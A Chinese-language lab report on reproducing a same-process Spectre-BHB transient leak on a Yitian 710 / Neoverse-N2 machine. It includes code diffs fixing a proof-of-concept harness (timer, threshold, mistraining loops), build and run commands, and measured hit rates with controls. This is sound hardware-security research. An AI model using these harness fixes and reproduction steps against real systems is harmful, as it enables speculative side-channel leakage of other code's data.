# L1-1（Spectre-BHB 同进程原语）修复与攻击复现报告

> 环境：倚天 710 / Neoverse-N2，Ubuntu 26.04，aarch64，用户 `wfy`。
> 范围：严格同进程、同特权（EL0）、仅 L1D Flush+Reload 读出。不碰跨特权 / 内核 / 关缓解。
> 结论一句话：**原 `fail/E004`「N2 未观察到同进程 in-place BHB 瞬态转向」被推翻。真因是四个 harness/测量缺陷，全部修复后，攻击成立。**

---

## 0. 最终结果（TL;DR）

| 项目 | 原结论（交接简报） | 本次修复后 |
|---|---|---|
| 判定 | `fail / E004`（信号不可区分） | **成功**：MAIN ≫ CTRL，推测依赖 |
| SELF（全同链正对照） | ~0.1%（被判死） | 峰值 86~96%，稳定可过 |
| MAIN（in-place 攻击，SHARE=1） | ~0.1% | 中位 **~65%**，峰值 **90.5%** |
| CTRL（噪声底） | 0% | 0%（全程 ≈0，对照干净） |
| POS（测量链路） | 100% | 100%（全程） |
| 窗口关（无推测对照） | — | **0.0%**（证明信号来自推测，非预取器/flush） |

**判定成立的证据链**：`POS=100%`（通道好）＋`CTRL≈0`（无误训练不漏）＋`MAIN≫CTRL`（误训练就漏）＋`窗口关→0%`（漏依赖推测窗口，排除预取器/残留）。

---

## 1. 根因：四个 harness/测量缺陷（都不是 N2 的问题）

原负结论不是「N2 免疫」，而是测量侧四处叠加，任何一处没修都看不到信号：

1. **时钟不对**
   - `perf_user_access=0` 导致 EL0 读 `PMCCNTR_EL0` 会 SIGILL，原代码退到 `cntvct_el0` 但没把阈值配套，且中途试过的"计数线程软时钟"跨核抖动极大（同参数 SELF 在 1.9%↔77% 乱跳，是**假阳性来源**）。
   - 最终方案：回到确定性的 `cntvct_el0`。它分辨率粗（1 tick ≈ 55 cycle）但**低抖动**，ruler 稳定 `cached≈2 / flushed≈9`，5× 分离，足够做二值命中判定。

2. **THR 过严**：`THR=6`（旧 cntvct 刻度）其实大体合适，但早期误用软时钟时 cached 漂到 16/31，`<THR` 几乎永不成立，命中被判死。最终在 cntvct 刻度下用 **THR=5**。

3. **TRAIN 过弱**：`TRAIN=8` 时 SELF 仅 1~4%；实测需 **TRAIN=128** 才能把 SELF 顶到 90%+。真正的分支预测器误训练本应几次饱和，需要 128 次这一点也提示要配合下一条一起看。

4. **replay 只训练一次（最隐蔽、最致命）**
   - `src/main.c` 的 replay 块里，MAIN/CTRL 每次测试前只调用 **1 次** `hit_ptr(...)`，而 SELF 和搜索循环都用 `for (t<train_n)` 训练 **128 次**。
   - 这就是「搜索报 23% → replay 塌到 0.2%」的真因：**不是噪声塌缩，是训练次数差了 128 倍**。补上训练循环后 MAIN 立刻从 ≈0 变为 11~90%。

---

## 2. 改了哪些文件

所有改动都在 `~/710_l1/bhi-spectre-bhb/` 下。攻击原语本体（`snippet.S` 的 ind/hit/ret gadget）**未改**。

### 2.1 `common/clock_thread.h`（新增文件）

把计时源统一到一个接口 `now()`，最终实现为确定性硬件虚拟计数器 `cntvct_el0`：

```c
#ifndef CLOCK_THREAD_H
#define CLOCK_THREAD_H
#include <stdint.h>
static inline void clock_start(void){}                 /* cntvct 不需要线程 */
static inline uint64_t now(void){
    uint64_t v; asm volatile("mrs %0, cntvct_el0":"=r"(v)); return v;
}
#endif
```

> 说明：期间试过两个弯路并排除——
> (a) **跨核计数线程软时钟**：分辨率高但方差致命（同参数结果乱跳），弃用；
> (b) **perf 事件 + `PMCCNTR_EL0`**：需全局开 `kernel.perf_user_access`（系统级，按实验室规则须找管理员），为不动系统而未采用。
> 最终 `cntvct_el0` 确定、够用。

### 2.2 `common/helper.h`（改 2 处）

```c
// 文件第 1 行新增：
#include "clock_thread.h"

// 原计时行（rdtscp 的 ARMV8 分支）：
-   asm volatile("mrs %0, cntvct_el0" : "=r" (result));
// 改为统一走 now()：
+   result = now();
```

### 2.3 `common/targets.h`（改 YITIAN_710 块的 THR）

```c
#elif defined YITIAN_710
#define ARCH            (ARMV8)
-#define THR             (6)
+#define THR             (5)          // cntvct 刻度：cached≈2 / flushed≈9
#define STRIDE          (4096)
...
```

### 2.4 `re/arm/bhb_brute_force/src/main.c`（4 处）

**(a) 新增 `NOSPEC` 开关——推测窗口开/关对照**（SELF 块内）：
```c
    int g_nospec = env_int("NOSPEC", 0);     // 在 SELFTEST 块前声明
    ...
    for (int t = 0; t < train_n; t++) self_ptr(&ftable[1], fr_buf);
-   clflush(&ftable[0]);
-   clflush(&ftable[1]);
+   if (!g_nospec) { clflush(&ftable[0]); clflush(&ftable[1]); }   // 不 flush ftable → 无窗口
    clflush(fr_buf);
    self_ptr(&ftable[0], fr_buf);
```
NOSPEC=1 时 ftable 不被 flush，`ldr x0,[x0]` 命中、`br x0` 立即解析 → 几乎无推测窗口。用于证明泄漏依赖推测。

**(b) 新增 `SHARE` 开关——共享末尾 K 跳历史**（主循环 in-place 处）：
```c
    int g_share = env_int("SHARE", 1);       // 与 g_nospec 相邻声明
#if IN_PLACE == 1
-   ret_history[hist_size-1] = hit_history[hist_size-1];
+   for (int s = 0; s < g_share && s < hist_size; s++)
+       ret_history[hist_size-1-s] = hit_history[hist_size-1-s];
#endif
```

**(c) 直接测 round-1，去掉 brute-force 挑尖**：
```c
-   if (hits > (3 * iters) / 4) {     // 原门槛 75%，比理想 SELF 还高，永不触发
+   if (1) {                          // 每轮直接测 MAIN/CTRL/POS，去掉挑尖噪声
```

**(d) ★关键修复：给 replay 的 MAIN/CTRL 补上训练循环**：
```c
// MAIN 块：
-   hit_ptr(&ftable[1], fr_buf);
+   for (int t = 0; t < train_n; t++) hit_ptr(&ftable[1], fr_buf);
    clflush(&ftable[0]); clflush(&ftable[1]); clflush(fr_buf);
    ret_ptr(&ftable[0], fr_buf);

// CTRL 块：
-   hit_ptr(&ftable[0], fr_buf);
+   for (int t = 0; t < train_n; t++) hit_ptr(&ftable[0], fr_buf);
    clflush(&ftable[0]); clflush(&ftable[1]); clflush(fr_buf);
    ret_ptr(&ftable[0], fr_buf);
```

### 2.5 构建命令

```bash
cd ~/710_l1/bhi-spectre-bhb/re/arm/bhb_brute_force
gcc -c src/snippet.S -o snippet.o -I../../../common -DYITIAN_710
gcc -D_GNU_SOURCE -DIN_PLACE=1 src/main.c -o main.o snippet.o \
    -pie -O1 -I../../../common -DYITIAN_710 -pthread
```
注：`-DIN_PLACE=1` 必须（`main.c` 用 `#if IN_PLACE==1` 但自身无 `#define`）；`-D_GNU_SOURCE`/`-pthread` 是软时钟弯路遗留，现无害可留。

### 2.6 运行时环境变量（本次新增/用到）

| 变量 | 含义 | 默认 | 本次取值 |
|---|---|---|---|
| `TRAIN` | 每次测试前的误训练次数 | 8 | **128** |
| `SHARE` | in-place 共享末尾历史跳数 | 1 | 1（纯 in-place）/ 扫描 |
| `NOSPEC` | 1=关推测窗口（对照） | 0 | 0 / 1 |
| `SELFTEST` | 跑 gate-2 自测 | 1 | 1 |
| `ITER` | 搜索循环轮数 | 1000 | 50（直接测时加速） |
| `THR` | 命中阈值（编译期，在 targets.h） | — | 5 |

---

## 3. 多了什么（产物）

- `common/clock_thread.h`：新增源文件（计时接口）。
- `~/710_l1/L1-1/main_run.log`：主跑日志（`tee` 保存）。
- `raw.csv`：每次 FOUND/直接测写出 6000 行（CTRL/MAIN/POS 各 2000，字段 `mode,iter,dt,hit`），在 `re/arm/bhb_brute_force/`。
- 本报告。

> 建议补：`git diff > ~/710_l1/L1-1_source.patch` 存权威改动。

---

## 4. 关键实验证据

### 4.1 推测窗口对照（排除预取器/残留假阳性）
```
窗口开 (NOSPEC=0, TRAIN=128): SELF = 41.5%
窗口关 (NOSPEC=1, TRAIN=128): SELF =  0.0%
```
窗口一关精确塌到 0 → fr_buf 被缓存的唯一途径就是推测窗口。**预取器、没冲干净的 flush 两类假阳性被排除。**

### 4.2 in-place 攻击重复 5 次（TRAIN=128, THR=5, taskset -c 2）
```
             rep1   rep2   rep3   rep4   rep5    中位数
SHARE=1 MAIN 26.4  11.2   65.3   90.5   72.9     65%
SHARE=64 MAIN 5.2  12.3    2.8    2.1   10.8      5%
CTRL         ~0    ~0     ~0     ~0     ~0        0%
POS          100   100    100    100    100     100%
```

要点：
- **MAIN 全程 ≫ CTRL、POS 全程 100%** → 攻击成立，可复现。
- **SHARE=1（只共享最后一跳）就足够**，中位 65%、峰值 90.5%。说明 N2 这条间接分支的误训练主要由 `br x0` 地址 + 末段历史主导，不需要深层历史匹配。
- SHARE=1 方差大（11~90%）源于另外 63 跳每轮随机、碰撞强弱不同——**这正是 brute-force 攻击者的抓手**：搜到一条好碰撞历史即可打到九成。

### 4.3 需要诚实记录的两点
- **不存在"SHARE 越大 MAIN 越高"的单调关系**。早前一次单跑看似单调是运行间噪声；重复后反而是 SHARE=1 更高。相应地，**不宣称已测出 BHB 深度**。
- **绝对命中率有运行间波动**（SHARE=64 固定历史仍 2~12%），主因是 `schedutil` 动态调频（DVFS）。

---

## 5. 复现（最短路径）

```bash
cd ~/710_l1/bhi-spectre-bhb/re/arm/bhb_brute_force
# 纯 in-place 攻击一轮
SHARE=1 TRAIN=128 ITER=50 taskset -c 2 ./main.o | grep -E 'SELF|MAIN|CTRL|POS'
# 推测依赖对照
NOSPEC=1 TRAIN=128 taskset -c 2 ./main.o | grep SELF   # 应 ≈0
```
期望：`CTRL≈0`、`POS=100%`、`MAIN` 显著 >0（中位 ~65%）、`NOSPEC=1` 时 ≈0。

---

## 6. 定性结论与后续

**结论**：倚天 710 / Neoverse-N2 上，同进程、EL0 的 in-place Spectre-BHB 瞬态泄漏**真实存在、推测依赖、可复现**。原 `fail/E004` 由四个 harness/测量缺陷造成（粗时钟、THR 过严、TRAIN 过弱、replay 只训练一次），已全部修复。这与 N2 被 ARM 官方列入 Spectre-BHB（CVE-2022-23960）受影响核的事实一致。

**范围提醒（不变）**：本结果只覆盖同进程 in-place 原语；跨特权 CVE 仍由 CSV2+BHB 清除在异常边界缓解，本实验未触及。

**后续（锦上添花，不影响定性结论）**：
1. **压方差**：请管理员把 governor 临时设为 `performance`，或多跑 20+ 次报中位数+区间。
2. **换硬件周期计数复核**：请管理员开 `kernel.perf_user_access=1`，用 `PMCCNTR_EL0` 做一次交叉验证（cntvct 偏粗）。
3. **补 v2 直接 BTI**（原待办 L1-1b）：进程内直接误训练间接分支跳指定目标，补上 Spectre-v2 这一环。
